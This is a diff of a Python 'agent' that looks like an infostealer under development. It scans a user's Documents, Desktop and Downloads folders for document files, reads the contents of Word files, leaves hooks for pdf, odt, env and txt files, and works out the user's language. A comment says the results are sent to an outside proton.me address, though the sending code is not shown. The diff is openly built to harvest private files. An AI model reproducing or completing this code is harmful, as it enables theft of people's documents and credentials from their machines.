@@ -1,4 +1,4 @@
-import sys, os, random
+import sys, os, random, re
 
 TARGET_FILETYPES = [
     "docx", 
@@ -35,21 +35,24 @@ class SleipnerAgent:
         self.lantern = Lantern()
 
     def launch(self):
-        if self._install_local_nltk():
+        if self._install_local_modules():
+            # system_language = self.determine_system_language()
+            # print("System language:", system_language)
+            # if system_language != "Undefined": 
+            #     self.give_agent_language_knowledge(system_language)
 
-            self._scan_files()
-            system_language = self.determine_system_language()
-            print("System language:", system_language)
-
-            if system_language != "Undefined": 
-                self.give_agent_language_knowledge(system_language)
+            self._scan_files("Downloads", "docx")
+            self._analyze_files()
+            ...
 
         else:
             self.send_results()
 
 
-    def _install_local_nltk(self) -> bool:
-        # Local modules install from libs folder
+    def _install_local_modules(self) -> bool:
+        ###################
+        ##  INSTALL NLTK ##
+        ###################
         sys.path.insert(0, os.path.abspath("./libs"))
         try:
             import nltk
@@ -69,11 +72,59 @@ class SleipnerAgent:
             self.stopwords = stopwords.words("english")
 
             print("Successfully imported NLTK.")
-            return True
+            
 
         except ImportError:
             print("NLTK not found.")
             return False
+        
+        #########################
+        ##  INSTALL LANGDETECT ##
+        #########################
+        try:
+            from langdetect import detect, DetectorFactory
+            DetectorFactory.seed = 42
+            
+            print("Langdetect successfully imported")
+        except ImportError:
+            print("langdetect not found in ./libs")
+            return False
+        
+        ##########################
+        ##  INSTALL DOCX READER ##
+        ##########################
+        try:
+            # First make sure packages and docx exist
+            packages_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'libs', 'packages')
+            docx_path = os.path.join(packages_path, 'docx')
+            
+            if not os.path.exists(docx_path):
+                print(f"docx module not found at expected path: {docx_path}")
+                return False
+                
+            # Make sure packages dir is in path
+            if packages_path not in sys.path:
+                sys.path.insert(0, packages_path)
+                
+            # Try importing with specific path handling
+            import docx
+            self.docx = docx
+            print(f"Successfully imported python-docx from {docx.__file__}")
+            return True
+            
+        except ImportError as e:
+            print(f"Failed to import python-docx: {e}")
+            
+            # Try direct import from libs directory as fallback
+            try:
+                sys.path.insert(0, os.path.abspath("./libs"))
+                import docx
+                self.docx = docx
+                print(f"Successfully imported python-docx from libs directory")
+                return True
+            except ImportError:
+                print("python-docx not found in any module path.")
+                return False
         
     def give_agent_language_knowledge(self, language_code: str) -> bool:
         """
@@ -117,9 +168,6 @@ class SleipnerAgent:
 
         return True
 
-
-
-
     def determine_system_language(self) -> str:
         """
         Analyze filenames to determine which language is used in the majority of times
@@ -128,17 +176,16 @@ class SleipnerAgent:
         2. Do this 5 times over to recieve 5 'top languages'.
         3. If one language is not >80% of 'top languages', rerun.
         """
-        sys.path.insert(0, os.path.abspath("./libs"))
-
-        try:
-            from langdetect import detect, DetectorFactory
-            DetectorFactory.seed = 42
-        except ImportError:
-            print("langdetect not found in ./libs")
-            return
-
-        if not self.potential_targets: 
-            self._scan_files()
+        
+        
+        filetypes = [
+            "docx", 
+            "pdf", 
+            "odt", 
+            ]
+        
+        self._scan_files('Documents', filetypes)
+        self._analyze_files()
 
         top_language = {
             "Language": "Undefined",
@@ -154,12 +201,13 @@ class SleipnerAgent:
 
             # Five turns of 50 filename samples
             for _ in range(5):
-                file_sample = random.sample(self.potential_targets, 50)
+                file_sample = random.sample(self.potential_targets, 5)
 
                 found_languages = []
 
                 # Clean up filename and analyze language used; add it to list
                 for filename in file_sample:
+                    print(filename)
                     filename_dir_cleaned = filename.split("\\")[-1]
                     filename_final_cleaned = filename_dir_cleaned.rsplit(".", 1)[0]
 
@@ -202,10 +250,77 @@ class SleipnerAgent:
                     top_language["Occurences"] = top_sample_language.count(language)
 
         return top_language["Language"]
+    
+    def read_docx_file(self, file_path):
 
-    def _scan_files(self):
+        packages_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'libs', 'packages')
+        sys.path.insert(0, packages_path)
+
+        """Read and display content from a Word document"""
+        if not os.path.exists(file_path):
+            print(f"Error: File '{file_path}' not found.")
+            return
+            
+        try:
+            # Open the document
+            doc = self.docx.Document(file_path)
+            
+            print(f"\n--- Content of {os.path.basename(file_path)} ---\n")
+            
+            # Print all paragraphs
+            for para in doc.paragraphs:
+                if para.text.strip():  # Only print non-empty paragraphs
+                    print(para.text)
+            
+            # Handle tables if present
+            if doc.tables:
+                print("\n--- Tables ---\n")
+                for i, table in enumerate(doc.tables):
+                    print(f"Table {i+1}:")
+                    for row in table.rows:
+                        row_text = [cell.text for cell in row.cells]
+                        print(" | ".join(row_text))
+                    print("")
+                    
+            print("\n--- End of document ---\n")
+            
+        except Exception as e:
+            print(f"Error reading document: {str(e)}")
+
+    def _read_pdf(self, filename) -> str:
+        # Clean and read pdf files
+        ...
+
+    def _read_odt(self, filename) -> str:
+        # Clean and read odt files
+        ...
+
+    def _scan_files(self, directory=None, filetypes=None):
         # Get all text files in the system
-        self.potential_targets = self.lantern.sense_surroundings()
+        self.potential_targets = self.lantern.sense_surroundings(directory, filetypes)
+
+    def _analyze_files(self):
+        if not self.potential_targets:
+            self._scan_files()
+
+        for filepath in self.potential_targets:
+            print(filepath)
+            filetype = filepath.split(".")[-1]
+            
+            match filetype:
+                case "docx":
+                    self.read_docx_file(filepath)
+                case "pdf":
+                    ...
+                case "odt":
+                    ...
+                case "env":
+                    ...
+                case "txt":
+                    ...
+
+        
+
 
     def send_results(self):
         # Send found results to no-reply-businesssuite@proton.me
@@ -226,13 +341,25 @@ class Lantern:
     def __init__(self):
         self.wanted_filetypes = TARGET_FILETYPES
 
-    def _shine_lantern(self) -> list:
+    def _shine_lantern(self, directory=None, filetypes=None) -> list:
         user_home = os.path.expanduser("~")
-        root_locations = [
-            os.path.join(user_home, "Documents"),
-            os.path.join(user_home, "Desktop"),
-            os.path.join(user_home, "Downloads")
-        ]
+
+        if filetypes:
+            self.wanted_filetypes = filetypes
+        else:
+            self.wanted_filetypes = TARGET_FILETYPES
+
+        if directory:
+            root_locations = [
+                os.path.join(user_home, directory)
+            ]
+
+        else:
+            root_locations = [
+                os.path.join(user_home, "Documents"),
+                os.path.join(user_home, "Desktop"),
+                os.path.join(user_home, "Downloads")
+            ]
 
         candidate_files = []
         for location in root_locations:
@@ -249,6 +376,6 @@ class Lantern:
 
         return candidate_files
     
-    def sense_surroundings(self) -> list:
-        relevant_content = self._shine_lantern()
+    def sense_surroundings(self, directory=None, filetypes=None) -> list:
+        relevant_content = self._shine_lantern(directory, filetypes)
         return relevant_content
